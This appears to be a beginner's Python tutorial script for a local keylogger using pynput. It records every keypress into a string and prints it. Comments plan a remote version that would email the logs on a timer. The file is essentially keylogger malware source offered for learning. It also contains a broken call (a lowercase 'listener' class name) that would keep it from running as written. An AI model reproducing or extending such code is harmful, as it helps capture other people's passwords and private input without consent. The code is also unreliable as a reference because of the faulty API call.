#!/usr/bin/env python
# two type of keylogger local(stored log in local sys),remote(report by sending mail based on time interval).
# we will study threading,oop,recursive fun
# pip install pynput(in linux may be same for window) it allow us to control mouse and keybord but for this we only use for keyboard
log = ""
import pynput.keyboard
def process_key_press(key):
    global log#global variable are useful to use but not good because when your code gets big and you are modifing it from multiple fun then hard to track so look class implentation v2
    try:
        log = log + str(key.char)#.char will not print 'u'in every letter you type and for special key like space makes error so use try catch
    except AttributeError:
        if key==key.space:
            log=log + " "
        else:    
            log = log + " " + str(key) + " "
    print(log)
keyboard_listener=pynput.keyboard.listener(on_press=process_key_press)#on_press is callback funclaaed when key is pressed
with keyboard_listener:
    keyboard_listener.join()
# basically with keyword in py is to interact with unmanaged stream of data sa above
# killall python command on another splitted cmmand line will kill all py code running on that sys